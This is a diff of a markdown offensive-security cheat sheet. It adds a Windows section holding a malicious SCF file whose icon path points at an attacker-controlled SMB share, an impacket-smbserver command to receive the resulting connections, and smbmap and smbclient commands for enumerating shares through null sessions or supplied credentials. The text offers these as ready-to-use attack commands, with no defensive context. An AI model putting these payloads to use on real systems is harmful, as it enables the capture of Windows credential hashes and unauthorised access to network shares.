@@ -198,7 +198,35 @@ export TERM=xterm
 ```
 export SHELL=bash
 ```
-# Active Directory (AD)
+# Windows
+
+Malicious SCF File
+```
+[Shell]
+Command=2
+IconFile=\\IP\smbfolder\CronoX.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+```
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+#SMB
+
+
+```
+smbmap -H IP -u usuario -p password
+```
+Listing with Null Session
+```
+smbclient -L IP -N
+```
+Enumeracion de directorios con usuario
+```
+smbclient \\\\IP\\directorio -U 'username%password'
+```
+
+## Active Directory (AD)
 
 Kerbrute
 
@@ -273,16 +301,4 @@ service apache2 start
 ```
 ```
 ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
-```
-Malicious SCF File
-
-```
-[Shell]
-Command=2
-IconFile=\\IP\smbfolder\CronoX.ico
-[Taskbar]
-Command=ToggleDesktop
-```
-```
-impacket-smbserver smbFolder $(pwd) -smb2support
 ```
